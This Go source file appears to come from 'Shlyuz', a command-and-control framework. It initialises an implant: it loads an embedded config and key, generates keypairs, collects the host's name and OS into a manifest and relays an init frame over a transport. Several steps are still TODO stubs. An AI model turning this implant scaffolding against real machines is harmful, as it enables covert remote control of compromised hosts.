package main

import (
	"embed"
	"log"
	"sync"

	"shlyuz/pkg/component"
	"shlyuz/pkg/config"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/transaction"
	"shlyuz/pkg/transport"
	"shlyuz/pkg/utils/logging"
	"shlyuz/pkg/utils/uname"
)

// embeded config
//
//go:generate cp -r ../../configs/shlyuz.conf ./shlyuz.conf
//go:generate cp -r ../../configs/symkey ./symkey
//go:generate go build -o zombie ../../internal/pkg/zombie.go
//go:embed *
var configFs embed.FS

// Initalizes the implant, reads the config, sets the values, initalizes the keys, etc
func genComponentInfo() component.Component {
	var YadroComponent component.Component
	var err error
	log.SetPrefix(logging.GetLogPrefix())
	log.Println("Started Shlyuz")
	YadroComponent.CurrentKeypair, err = asymmetric.GenerateKeypair()
	if err != nil {
		log.Fatalln("failed to generate a current keypair")
	}
	rawConfig, err := configFs.ReadFile("shlyuz.conf")
	if err != nil {
		log.Fatalln("failed to get embedded config")
	}
	symKey, err := configFs.ReadFile("symkey")
	if err != nil {
		log.Fatalln("failed to retrieve symkey")
	}
	// componentConfig := config.ReadConfig(rawConfig, YadroComponent.XorKey, symKey)
	componentConfig := config.ReadPlaintextConfig(rawConfig, symKey) // debug
	parsedConfig := config.ParseConfig(componentConfig.Message)
	YadroComponent.Config.Id = parsedConfig.Id
	YadroComponent.ComponentId = YadroComponent.Config.Id
	YadroComponent.Config.TransportName = parsedConfig.TransportName
	YadroComponent.Config.InitSignature = parsedConfig.InitSignature
	YadroComponent.Config.TskChkTimer = parsedConfig.TskChkTimer
	YadroComponent.Config.CryptoConfig = parsedConfig.CryptoConfig
	YadroComponent.InitalKeypair = YadroComponent.Config.CryptoConfig.CompKeypair
	YadroComponent.XorKey = YadroComponent.Config.CryptoConfig.XorKey
	YadroComponent.ConfigKey = componentConfig.Key
	YadroComponent.Manifest = makeManifest(YadroComponent.Config.Id)
	YadroComponent.CurrentLpPubkey = parsedConfig.CryptoConfig.LpPk

	return YadroComponent
}

func makeManifest(componentId string) component.ComponentManifest {
	var generatedManifest component.ComponentManifest
	platInfo := uname.GetUname()
	generatedManifest.Implant_hostname = platInfo.Uname.Nodename
	generatedManifest.Implant_id = componentId
	generatedManifest.Implant_os = platInfo.Uname.Sysname
	return generatedManifest
}

func main() {
	Component := genComponentInfo()
	// TODO: Prepare your transport
	transportWg := sync.WaitGroup{}
	defer transportWg.Wait()
	transport, _, err := transport.PrepareTransport(&Component, []string{})
	if err != nil {
		log.Fatalln("transport failed to initalize: ", err)
	}
	Component.CmdChannel = make(chan []byte)

	// TODO: Send the actual manifest
	initFrame := transaction.GenerateInitFrame(Component)
	transaction.RelayInitFrame(&Component, initFrame, transport)

	// TODO: Implement loop here to do the actual stuff
}
